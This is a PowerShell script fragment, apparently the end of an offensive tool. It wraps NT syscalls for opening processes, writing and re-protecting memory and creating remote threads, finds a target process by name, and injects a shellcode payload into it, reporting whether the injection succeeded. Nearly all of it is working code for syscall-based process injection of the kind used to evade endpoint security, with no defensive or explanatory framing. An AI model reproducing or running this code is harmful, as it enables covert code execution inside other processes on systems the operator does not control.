function Invoke-WriteVirtualMemory {
    param(
        [IntPtr]$ProcessHandle,
        [IntPtr]$BaseAddress,
        [IntPtr]$Buffer,
        [UInt32]$NumberOfBytesToWrite,
        [IntPtr]$NumberOfBytesWrittenPtr
    )

    $spec = $Global:RoutineSpecs["WriteVirtualMemory"]

    return $spec.Delegate.Invoke(
        $ProcessHandle,
        $BaseAddress,
        $Buffer,
        $NumberOfBytesToWrite,
        $NumberOfBytesWrittenPtr
    )
}

function Invoke-ProtectVirtualMemory {
    param(
        [IntPtr]$ProcessHandle,
        [IntPtr]$BaseAddressPtr,
        [IntPtr]$RegionSizePtr,
        [UInt32]$NewProtect,
        [IntPtr]$OldProtectPtr
    )

    $spec = $Global:RoutineSpecs["ProtectVirtualMemory"]

    <# # Debug Stuff
    Write-Host "ProcessHandle: $ProcessHandle"
    Write-Host "BaseAddressPtr: $BaseAddressPtr"
    Write-Host "RegionSizePtr: $RegionSizePtr"
    Write-Host "NewProtect: $NewProtect"
    Write-Host "OldProtectPtr: $OldProtectPtr"
    #> 


    return $spec.Delegate.Invoke(
        $ProcessHandle,
        $BaseAddressPtr,
        $RegionSizePtr,
        $NewProtect,
        $OldProtectPtr
    )
}

function Invoke-CreateThreadEx {
    param(
        [IntPtr]$ThreadHandlePtr,
        [UInt32]$DesiredAccess,
        [IntPtr]$ObjectAttributes,
        [IntPtr]$ProcessHandle,
        [IntPtr]$StartRoutine,
        [IntPtr]$Argument,
        [UInt32]$CreateFlags,
        [UIntPtr]$ZeroBits,
        [UIntPtr]$StackSize,
        [UIntPtr]$MaximumStackSize,
        [IntPtr]$AttributeList
    )

    $spec = $Global:RoutineSpecs["CreateThreadEx"]

    return $spec.Delegate.Invoke(
        $ThreadHandlePtr,
        $DesiredAccess,
        $ObjectAttributes,
        $ProcessHandle,
        $StartRoutine,
        $Argument,
        $CreateFlags,
        $ZeroBits,
        $StackSize,
        $MaximumStackSize,
        $AttributeList
    )
}

function Invoke-OpenProcess {
    param(
        [IntPtr]$ProcessHandlePtr,
        [UInt32]$DesiredAccess,
        [IntPtr]$ObjectAttributesPtr,
        [IntPtr]$ClientIdPtr
    )

    $spec = $Global:RoutineSpecs["OpenProcess"]

    return $spec.Delegate.Invoke(
        $ProcessHandlePtr,
        $DesiredAccess,
        $ObjectAttributesPtr,
        $ClientIdPtr
    )
}


# Initialize the registry

Initialize-RoutineRegistry

$Global:SyscallBindLog | Format-Table Wrapper, Bind, SysId, Offset, Target, TargetAddr, Stub -AutoSize

###############################################################
# Execute
###############################################################

$result = Find-ProcessPidViaNtQuerySystemInformation -ProcessName $targetProcName

if ($result) {
    Write-Host "[TARGET] Searching for target process: $targetProcName"
    Write-Host "         Found: $($result.ProcessName)"
    Write-Host "         PID: $($result.Pid)"
    Write-Host ("         Handle: 0x{0:X}" -f $result.Handle.ToInt64())
    Write-Host " " 
}
else {
    Write-Host "[-] Process not found"
}

$execute = inject -ProcessHandle $result.Handle -Payload $shellcode -PayloadSize $shellcode.Length

if ($execute) {
    Write-Host "[OK] Injection successful."
} else {
    Write-Host "[ERROR] Injection failed."
}




# close the handle because i luv u windows <3
#[Kernel32]::CloseHandle($result.Handle)